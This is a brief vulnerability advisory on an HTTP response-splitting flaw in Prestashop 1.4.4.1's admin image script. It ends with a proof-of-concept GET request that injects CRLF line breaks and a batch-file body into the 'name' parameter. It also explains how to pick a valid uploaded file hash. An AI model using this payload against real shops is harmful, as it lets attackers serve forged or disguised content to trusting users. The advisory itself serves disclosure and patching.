Prestashop is prone to an HTTP-response-splitting vulnerability because it fails to sufficiently sanitize user-supplied data.

Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid various attacks that try to entice client users into a false sense of trust.

Prestashop 1 4.4.1 is vulnerable; other versions may also be affected.

GET: http://www.example.com/admin/displayImage.php?img=<name_of_existing_file_in_md5_format>&name=asa.cmd"%0d%0a%0d%0a@echo off%0d%0aecho running batch file%0d%0apause%0d%0aexit
Note: The <name_of_existing_file_in_md5_format> is the name of one file existing on the "upload/" folder. It&#039;s name must be a MD5 hash, without any extension. ex: "435ed7e9f07f740abf511a62c00eef6e"
